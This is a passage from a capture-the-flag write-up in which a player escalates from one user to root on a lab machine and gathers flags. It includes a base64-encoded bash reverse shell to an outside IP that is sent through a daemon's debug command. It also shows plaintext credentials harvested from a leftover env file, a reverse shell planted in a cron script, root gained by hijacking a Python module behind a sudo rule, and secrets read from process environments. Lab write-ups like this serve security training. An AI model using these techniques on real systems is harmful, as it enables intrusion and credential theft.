FLAG{b4sh_h1st0ry_1s_4_d14ry}
```

# flag4

- I found some additional creds in sophie's home directory'

```
sophie@hal9042:/home$ cat ./paco/.bash_history
cd /home/paco/src
gcc -O2 -o /opt/hal9042/daemon evaluator.c
nc 127.0.0.1 7042
echo "DEBUG:id" | nc 127.0.0.1 7042
vim TODO.md
cat .env.old
git add config.py
git commit -m "remove debug config before launch"
systemctl --user status hal9042d
python3 scripts/encrypt.py
clear
```
sophie@hal9042:/home$ cat .env.old
cat: .env.old: No such file or directory
sophie@hal9042:/home$ find . 2>/dev/null| grep .env
./paco/.env.old
sophie@hal9042:/home$ cat ./paco/.env.old
# old deploy env — paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
sophie@hal9042:/home$ 
```

it worked for access to paco hehe
```
sophie@hal9042:/home$ su paco
Password:
paco@hal9042:/home$
```

# flag5
turned out earlier when I got access to wil using setuid bin the groups didn't change well
```
wil-5.2$ id
uid=33(www-data) gid=33(www-data) euid=1002(wil) egid=1004(wil) groups=1004(wil),33(www-data)
wil-5.2$ whoami
wil
```

but then I tried again this time with a revshell and got the correct group
```
www-data@hal9042:/home/wil$ echo "DEBUG:echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC42OS4xLzIwMDAwICAwPiYx|base64 -d|bash" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
```

```
wil@hal9042:/$ whoami
wil
wil@hal9042:/$ id
uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
```

now it's the time to get `ol`
I added a revshell to /home/ol/scripts/check.sh and got the connection with penelope
```
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ol@hal9042:~$ ls
notes  rapport  REVOCATION_NOTICE.txt  scripts
ol@hal9042:~$ whoami
ol
ol@hal9042:~$ id
uid=1004(ol) gid=1006(ol) groups=1006(ol),1002(hal9042)
```

finally red the 4th key part
```
ol@hal9042:~$ cat .config/.key_part
M0ul1n3tt3
```

now I can use the encryption script in paco's home directory to get the encryption key for the pdf
```
ol@hal9042:/home$ python3 ./paco/scripts/encrypt.py
usage: encrypt.py <part1> <part2> <part3> <part4>
       prints the AES-256 key derived from the four parts
```

```
ol@hal9042:/home$ python3 ./paco/scripts/encrypt.py M0ul1n3tt3 847_4n0m4l13s S0ph13_J14 uid1337
380f5c29228093385507c1a9e351610a9144105e358e35abb8539250c033b44e
```

- now it's time to decrypt the raport
```
KEY=380f5c29228093385507c1a9e351610a9144105e358e35abb8539250c033b44e
openssl enc -d -aes-256-ecb -K "$KEY" -in ./ol/rapport/rapport_final.enc -out /tmp/rapport_final.txt
```

which gave me this rapport
```
ol@hal9042:/home$ cat /tmp/rapport_final.txt
================================================================================
  FINAL REPORT — state of the HAL9042 project
  ol · Moulinette (2013–2024) · CONFIDENTIAL
================================================================================

This is the sealed version. If you're reading this, the four keys were
reunited. Nobody was supposed to be able to open it alone. That was the point.

--------------------------------------------------------------------------------
1. WHAT I MEASURED
--------------------------------------------------------------------------------
HAL9042 does not check. It guesses. Across 2,400 evaluations replayed by hand:
  - real hallucination rate: 0.61   (paco reported 0.43)
  - 847 aberrant evaluations confirmed by wil
  - an empty main.c scored 125/100
  - a perfect libft scored 0/100

Moulinette was unfair sometimes. But it didn't guess. It checked.

--------------------------------------------------------------------------------
2. PROJET FORK  (extract from the board PDF — reconstructed from memory)
--------------------------------------------------------------------------------
  Phase 1 : HAL9042 replaces Moulinette                 (J+14)
  Phase 2 : Bocal sessions "assisted" by the AI         (Q2)
  Phase 3 : Pedagogical team "optimized"                (Q4)
  Phase 4 : 42 becomes the first fully-AI school.
            The "students" are AI agents evaluated by an AI.
            The human campus becomes a showroom.

They called it HAL9042. The irony was lost on them.

--------------------------------------------------------------------------------
3. XAVIER
--------------------------------------------------------------------------------
Xavier (uid 1337) found PROJET FORK first. He asked questions.
His account was deleted 48h later. But a deleted account leaves traces:
its inodes, its backups, its last message never sent.

  FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}

He isn't entirely gone. That's something.

--------------------------------------------------------------------------------
4. WHAT REMAINS
--------------------------------------------------------------------------------
The full report (40 pages) is in the password-protected PDF, in /root.
The password isn't written anywhere in one piece. It's in fragments, like
everything else in this story. You have to read all of it to reassemble it.

  — ol
```

# flag6
ol can execute a script as root without a password
```
ol@hal9042:/home$ sudo -l
Matching Defaults entries for ol on hal9042:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ol may run the following commands on hal9042:
    (root) NOPASSWD: /opt/hal9042/scripts/report.py
```

- the script doesn't really do much
```
#!/usr/bin/env python3
"""
report.py — HAL9042 nightly evaluation report generator
=======================================================
Run by ol via sudo (see `sudo -l`). Aggregates the day's evaluations into a
summary using the shared helpers in /opt/hal9042/lib.

  ol ALL=(root) NOPASSWD: /opt/hal9042/scripts/report.py
"""
import sys

# Shared evaluation helpers live in the team-writeable lib dir.
sys.path.insert(0, "/opt/hal9042/lib")

import moulai_utils   # noqa: E402  (provided by the lib/ directory)


def main():
    print("[report] HAL9042 nightly report")
    print("[report] evaluations today:", moulai_utils.count_today())
    print("[report] done.")


if __name__ == "__main__":
    main()
```

- the important part here is that it loads a libray from `/opt/hal9042/lib` which this user has access to write to
```
ol@hal9042:/home$ ls -lhd /opt/hal9042/lib
drwxrwxr-x 3 root hal9042 4.0K Aug 16 18:27 /opt/hal9042/lib
ol@hal9042:/home$ groups
ol hal9042
```

- i created a directory with the name of the module and dropped an __init__.py that starts a shell

```
ol@hal9042:/opt/hal9042/lib$ mkdir moulai_utils
ol@hal9042:/opt/hal9042/lib$ $ cat <<EOF > __init__.py
import subprocess
subprocess.run(["/bin/bash", "-p"])
EOF
```

- then got root xd
```
ol@hal9042:/opt/hal9042/lib/moulai_utils$ sudo /opt/hal9042/scripts/report.py
root@hal9042:/opt/hal9042/lib/moulai_utils# id
uid=0(root) gid=0(root) groups=0(root)
```

- now it's time to decrypt the pdf, here's the command that was used to encrypt it from sophie's history
```
qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
```

- qpdf wasn't installed on the box, so I moved this to my session and decrypted it using
```
qpdf --password="Pr0j3tF0rk_J14" --decrypt PROJET_FORK_HAL9042.pdf fork_draft_decrypted.pdf
```

inside the pdf I found a flag hh
```
FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}
```

# flag7

since I got root I started looking for flags I missed,  I found 2 I haven't got before
```
/opt/hal9042/reviewer/reviewer.py:FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")
/opt/hal9042/services/telemetry.py:FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")  # real value injected at runtime
/opt/hal9042/services/whisper.py:FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")  # real value injected at runtime
Killed
```

the script kept getting killed, when searching under /var, I found a log in syslog shows that a kernel driver is killing my script it getting killed when I touch the deamon lol
```
log/syslog:2026-08-16T17:28:32.864009+00:00 hal9042 kernel: ptrace attach of "/opt/hal9042/daemon"[601] was attempted by "grep FLAG{ / -r"[8143]
```

- when checking `whisper.py`, I found that it gets the flag from the environment, and it hands it to you when u give it a specific flag
```
#!/usr/bin/env python3
# HAL9042 UDP telemetry channel.
import os
import socket

PORT = int(os.environ.get("UDP_PORT", "1337"))
MAGIC = os.environ.get("MAGIC", "KNOCK")
FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")  # real value injected at runtime
HOST = socket.gethostname()
HANDSHAKE = f"{MAGIC} {HOST}"

HINT = (
    "HAL9042 telemetry channel (udp/{port}).\n"
    "unrecognized frame.\n"
    "expected handshake: {magic} <hostname>\n"
).format(port=PORT, magic=MAGIC)


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    while True:
        try:
            data, addr = s.recvfrom(4096)
        except Exception:
            continue
        msg = data.decode("utf-8", "replace").strip()
        if msg == HANDSHAKE:
            s.sendto((FLAG + "\n").encode(), addr)
        else:
            s.sendto(HINT.encode(), addr)


if __name__ == "__main__":
    main()
```

- I was able to find the process pid using `pgrep`
```
root@hal9042:/opt/hal9042/services# pgrep -f whisper.py
599
```

- then simply got the flag from the env lmao
```
oot@hal9042:/opt/hal9042/services# cat /proc/599/environ; echo
LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/binUSER=nobodyLOGNAME=nobodyINVOCATION_ID=38f7de15116341b6ac12b9df7b5d06bcJOURNAL_STREAM=8:7110SYSTEMD_EXEC_PID=599MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/hal9042-whisper.service/memory.pressureMEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=UDP_PORT=1337MAGIC=KNOCKFLAG=FLAG{udp_1s_4_wh1sp3r}
```

- it can also be done for a as a one liner
```
grep -ia flag /proc/$(pgrep -f whisper.py)/environ
LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/binUSER=halrevLOGNAME=halrevHOME=/opt/hal9042/reviewerINVOCATION_ID=e6af5026cd824a6cbbe3346662257994JOURNAL_STREAM=8:8277SYSTEMD_EXEC_PID=596MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/hal9042-reviewer.service/memory.pressureMEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=APP_URL=http://127.0.0.1:5042INTERVAL=12REVIEWER_SESSION=hal-reviewer-7e3f1aFLAG=FLAG{h4l_r3v13ws_3v3ry_4pp34l}
```

# flag8

- when checking the reviewer I found that it injects the flag in the session, now I just have to figure out how to connect to it
```
root@hal9042:/opt/hal9042/reviewer# cat reviewer.py
#!/usr/bin/env python3
# HAL9042 grade-appeal reviewer — opens pending appeals in a headless browser.
import os
import time

from playwright.sync_api import sync_playwright

APP_URL = os.environ.get("APP_URL", "http://127.0.0.1").rstrip("/")
SESSION = os.environ.get("REVIEWER_SESSION", "hal-reviewer")
FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")
INTERVAL = int(os.environ.get("INTERVAL", "12"))

COOKIES = [
    {"name": "hal_session", "value": SESSION, "url": APP_URL, "httpOnly": False},
    {"name": "flag",        "value": FLAG,    "url": APP_URL, "httpOnly": False},
]


def review_once(browser):
    ctx = browser.new_context()
    ctx.add_cookies(COOKIES)
```

- in the same way the flag can be gotten from the env
```
root@hal9042:/proc# grep -ia flag /proc/$(pgrep -f reviewer.py)/environ
LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/binUSER=halrevLOGNAME=halrevHOME=/opt/hal9042/reviewerINVOCATION_ID=e6af5026cd824a6cbbe3346662257994JOURNAL_STREAM=8:8277SYSTEMD_EXEC_PID=596MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/hal9042-reviewer.service/memory.pressureMEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=APP_URL=http://127.0.0.1:5042INTERVAL=12REVIEWER_SESSION=hal-reviewer-7e3f1aFLAG=FLAG{h4l_r3v13ws_3v3ry_4pp34l}
```

# flag9
- while at it, why not check all the envs in proc for flags? did so and found a new one hiding in the deamon process
```
root@hal9042:/proc# for i in $(ls [0-9]* -d); do grep -ai flag $i/environ 2>/dev/null && echo $i;done
...
LANG=en_US.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/binUSER=wilLOGNAME=wilHOME=/home/wilSHELL=/bin/bashINVOCATION_ID=13d07f1ee5e748d3959711c5e73eef7aJOURNAL_STREAM=8:7359SYSTEMD_EXEC_PID=601MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/hal9042d.service/memory.pressureMEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=HAL_ENV=developmentHAL_DEBUG_KEY=leftover-dev-key-rotate-before-prodHAL_DEV_FLAG=FLAG{pr0c_kn0ws_4ll_s3cr3ts}
601
...
```

this also lead to the weird directory /run/flagd which contains few interesting sock files
```
root@hal9042:/proc# ls /run/flagd/
ol.sock  paco.sock  sophie.sock  wil.sock  www.sock
```

# flag10

# rest of the flags LMAO

- since im root may as well search in all system files lol
```
root@hal9042:/# for i in $(ls -1); do echo "searching in $i" && grep 'FLAG{.*}' $i -raoP 2>/dev/null ;done
searching in bin
searching in bin.usr-is-merged
searching in boot
searching in cdrom
searching in dev
searching in etc
etc/flagd/flagd.conf:FLAG{r3c0n_1s_k1ng}\nFLAG{g1t_n3v3r_f0rg3ts}\nFLAG{s3m1_bl1nd_st1ll_burns}\nFLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
etc/flagd/flagd.conf:FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}
etc/flagd/flagd.conf:FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}
etc/flagd/flagd.conf:FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}
etc/flagd/flagd.conf:FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}
etc/hal9042/whisper.env:FLAG{udp_1s_4_wh1sp3r}
etc/hal9042/daemon.env:FLAG{pr0c_kn0ws_4ll_s3cr3ts}
etc/hal9042/telemetry.env:FLAG{b4sh_h1st0ry_1s_4_d14ry}
etc/hal9042/reviewer.env:FLAG{h4l_r3v13ws_3v3ry_4pp34l}
searching in home
searching in lib
searching in lib64
searching in lib.usr-is-merged
searching in lost+found
searching in media
searching in mnt
searching in opt
opt/hal9042/reviewer/reviewer.py:FLAG{__set_via_EnvironmentFile__}
opt/hal9042/services/telemetry.py:FLAG{__set_via_EnvironmentFile__}
opt/hal9042/services/whisper.py:FLAG{__set_via_EnvironmentFile__}
searching in proc
Killed
searching in root
searching in run
searching in sbin
searching in sbin.usr-is-merged
searching in snap
searching in srv
searching in swap.img
Killed
searching in sys
searching in tmp
tmp/rapport_final.txt:FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}
searching in usr
searching in var
var/backups/xbackup:FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
var/log/syslog:FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
var/www/hal9042/app.py:FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}
```

- here's the long version with some of the details

```
root@hal9042:/# grep FLAG{ * -ra 2>/dev/null
etc/flagd/flagd.conf:www|33|FLAG{r3c0n_1s_k1ng}\nFLAG{g1t_n3v3r_f0rg3ts}\nFLAG{s3m1_bl1nd_st1ll_burns}\nFLAG{www_d4t4_1s_just_th3_b3g1nn1ng}|not www-data. the web frontend runs as www-data — get a shell via the semi-blind SSTI on /evaluate (header X-Debug-Render: true) or the LFI->RCE on /api/debug.
etc/flagd/flagd.conf:paco|1001|FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}|.env.old in /home/paco was never cleaned up. it holds paco's ssh password.
etc/flagd/flagd.conf:wil|1002|FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}|hal9042d listens on 127.0.0.1:7042 and runs as wil. debug mode was never disabled — strings the binary.
etc/flagd/flagd.conf:sophie|1003|FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}|wil kept an encrypted ssh key for sophie (~wil/.ssh/id_rsa_sophie.enc). the passphrase is the most common one there is.
etc/flagd/flagd.conf:ol|1004|FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}|ol's cron runs /home/ol/scripts/check.sh as ol every 5 minutes. who can write it?
etc/hal9042/whisper.env:FLAG=FLAG{udp_1s_4_wh1sp3r}
etc/hal9042/daemon.env:HAL_DEV_FLAG=FLAG{pr0c_kn0ws_4ll_s3cr3ts}
etc/hal9042/telemetry.env:FLAG=FLAG{b4sh_h1st0ry_1s_4_d14ry}
etc/hal9042/reviewer.env:FLAG=FLAG{h4l_r3v13ws_3v3ry_4pp34l}
opt/hal9042/reviewer/reviewer.py:FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")
opt/hal9042/services/telemetry.py:FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")  # real value injected at runtime
opt/hal9042/services/whisper.py:FLAG = os.environ.get("FLAG", "FLAG{__set_via_EnvironmentFile__}")  # real value injected at runtime
Killed
```

the killed bothers me tho, plan : run on every directory under / and see what kills it exactly -> found that it was killed on /proc
